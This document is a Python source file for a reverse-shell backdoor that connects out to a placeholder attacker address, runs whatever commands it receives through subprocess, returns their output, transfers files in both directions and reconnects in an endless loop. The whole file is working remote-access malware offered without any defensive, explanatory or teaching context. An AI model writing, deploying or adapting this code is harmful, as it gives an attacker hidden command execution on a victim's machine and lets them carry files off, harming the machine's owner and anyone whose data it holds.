import socket
import subprocess
import os
import sys

ATTACKER_IP = "ATTACKER_IP"
ATTACKER_PORT = ATTACKER_PORT

def reliable_send(data, conn):
    conn.send(data.encode('utf-8'))

def reliable_recv(conn):
    data = conn.recv(1024).decode('utf-8')
    return data

def upload_file(conn, filename):
    with open(filename, 'wb') as f:
        conn.send(b"READY")
        while True:
            bits = conn.recv(1024)
            if bits.endswith(b"DONE"):
                f.write(bits[:-4])
                break
            f.write(bits)

def download_file(conn, filename):
    with open(filename, 'rb') as f:
        conn.send(b"READY")
        while True:
            bits = f.read(1024)
            if not bits:
                break
            conn.send(bits)
        conn.send(b"DONE")

def reverse_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_IP, ATTACKER_PORT))

        while True:
            command = reliable_recv(s)

            if command.lower() == "exit":
                break

            elif command.startswith("cd "):
                try:
                    os.chdir(command[3:])
                    cwd = os.getcwd()
                    reliable_send(cwd, s)
                except Exception as e:
                    reliable_send(str(e), s)

            elif command.startswith("upload "):
                filename = command[7:]
                upload_file(s, filename)
                reliable_send(f"Uploaded {filename}", s)

            elif command.startswith("download "):
                filename = command[9:]
                download_file(s, filename)
                reliable_send(f"Downloaded {filename}", s)

            else:
                try:
                    output = subprocess.getoutput(command)
                    reliable_send(output, s)
                except Exception as e:
                    reliable_send(str(e), s)

    except Exception as e:
        print(f"Connection error: {e}")
    finally:
        s.close()

def run():
    while True:
        try:
            reverse_shell()
        except:
            continue

if __name__ == "__main__":
    run()

